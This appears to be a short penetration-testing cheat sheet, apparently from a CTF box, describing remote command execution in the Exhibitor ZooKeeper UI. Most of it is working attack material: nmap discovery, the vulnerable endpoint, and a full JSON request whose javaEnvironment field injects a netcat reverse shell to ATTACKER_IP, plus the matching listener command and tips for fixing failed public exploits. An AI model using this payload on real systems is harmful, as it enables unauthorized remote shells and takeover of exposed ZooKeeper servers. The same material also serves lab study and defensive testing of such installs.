# Exhibitor / ZooKeeper

Exhibitor is a ZooKeeper management UI. Older or unauthenticated installs can allow command execution by modifying the ZooKeeper configuration.

## Discovery

```bash
nmap -sC -sV TARGET -p 2181,8080,8081
# 2181/tcp open  zookeeper  Zookeeper 3.4.x
# 8080/tcp open  http       Jetty
# 8081/tcp open  http       nginx
```

Common UI path:

```text
http://TARGET:8080/exhibitor/v1/ui/index.html
```

## Exhibitor Config RCE

In the UI, toggle editing on and capture the POST to:

```text
/exhibitor/v1/config/set
```

The interesting field is `javaEnvironment`. It can be abused with command substitution:

```json
"javaEnvironment":"$(/bin/nc -e /bin/sh 'ATTACKER_IP' '80' &)"
```

Full request body shape:

```json
{
  "zookeeperInstallDirectory": "/opt/zookeeper",
  "zookeeperDataDirectory": "/zookeeper/data",
  "serversSpec": "1:pelican",
  "javaEnvironment": "$(/bin/nc -e /bin/sh 'ATTACKER_IP' '80' &)",
  "clientPort": "2181",
  "connectPort": "2888",
  "electionPort": "3888",
  "autoManageInstances": "1",
  "serverId": 1
}
```

Start a listener and send the modified config:

```bash
nc -nlvp 80
```

If a public exploit fails, manually capture a valid config request from the target and only modify `javaEnvironment`; stale scripts often send the wrong fields or ports.
